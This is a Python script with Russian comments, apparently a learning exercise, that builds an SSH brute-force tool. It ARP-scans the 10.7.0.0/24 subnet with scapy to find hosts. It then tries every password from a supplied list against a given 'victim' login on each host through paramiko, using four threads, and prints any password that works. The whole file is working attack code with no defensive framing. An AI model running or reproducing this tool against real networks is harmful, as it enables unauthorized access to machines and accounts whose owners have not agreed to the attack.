import os
import argparse
import paramiko
import scapy.all as scapy
import concurrent.futures
from scapy.layers.l2 import ARP, Ether
from pprint import pprint


def args():
    """
    Функция парсинга аргументов командной строки
    Из твоих примеров
    """
    parser = argparse.ArgumentParser("my awesome net scanner")

    # Ожидаем два ключа -l и -d
    parser.add_argument("-l", "--login", help="ssh login of victim user", required=True)
    parser.add_argument("-d", "--passwords", help="passwords for bruteforce", required=True)

    return parser.parse_args()


def read_file(filepath):
    """
    Функция чтения из файла
    """
    with open(filepath, "r") as fp:
        content = fp.read()

    # Возвращаем список с паролями
    return [line.strip() for line in content.split('\n') if line != '']  # разбиваем все содержимое файла через \n и .strip удаляем пробелы с начала и конца строки. Заполняем список, при условии что строка не пустая ( if line != '' )


def scan():
    """
    Функция сканнинга сети из твоих примеров
    Судя по всему создаются ARP пакеты
    хз че тут происходит, нужно читать доку
    """
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp = ARP(pdst="10.7.0.0/24")
    packets = broadcast / arp
    answered, uns = scapy.srp(packets, timeout=4, verbose=False)

    return [(r.psrc, r.hwsrc) for s, r in answered]


def ssh_connect(ip, login, passwords):
    # Создаем экземпляр класса SSHClient библиотеки paramiko
    ssh = paramiko.SSHClient()

    # устанавливаем политику AutoAddPolicy при подключении
    # к серверам без известного ключа хоста
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Инициализируем пустую результирующую строку
    result = ''

    for password in passwords:
        """
        Итерируемся по паролям
        Пробуем подключиться по ssh
        """
        try:
            # Ловим Exception при подключении
            # если успешно подключились к хосту
            # то ошибка выброшена не будет и переходим в блок else
            ssh.connect(
                    hostname=ip,
                    username=login.strip(),
                    password=password,
                    look_for_keys=False,
                    allow_agent=False,
                    timeout=10,
                    port=22
                    )
        except:
            # Если все таки выброшено исключение
            # ни чего не делаем
            pass
        else:
            # заполняем результирующую строку сообщением
            result = f'successful connection for {ip} with password `{password}`'
        
        # Закрываем соединение в любом случае
        ssh.close()

    return result


def main():
    options = args()

    # Читаем файл с паролями
    passwords = read_file(options.passwords)

    # Получаем список кортежей (айпишник, mac-addr)
    ip_list = scan()
    #ip_list = [('10.7.0.126', 'b0:be:83:3d:22:a9')]  # Заглушка для тестирования самого себя

    # Класс ThreadPoolExecutor() модуля concurrent.futures использует пул не более
    # max_workers потоков для асинхронного выполнения вызовов
    # Используем контекстный менеджер для обеспечения закрытия потоков
    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
        # Пустой список для объектов Future
        futures = []

        for ip, mac in ip_list:
            # Метод Executor.submit() планирует выполнение вызываемого объекта ( первый аргумент, у нас это функция ssh_connect), далее перечесляем аргументы которые принимает функция ssh_connect
            # и возвращает объект Future, представляющий результаты выполнения вызываемого объекта
            future = executor.submit(ssh_connect, ip=ip, login=options.login, passwords=passwords)
            futures.append(future)

        # Функция as_completed() модуля concurrent.futures возвращает итератор
        # по экземплярам Future (возможно, созданным разными экземплярами Executor),
        # который возвращает объекты Future по мере их завершения (завершенные или отмененные)
        for future in concurrent.futures.as_completed(futures):
            # Выводим результат функции
            print(future.result())

if __name__ == '__main__':
    main()

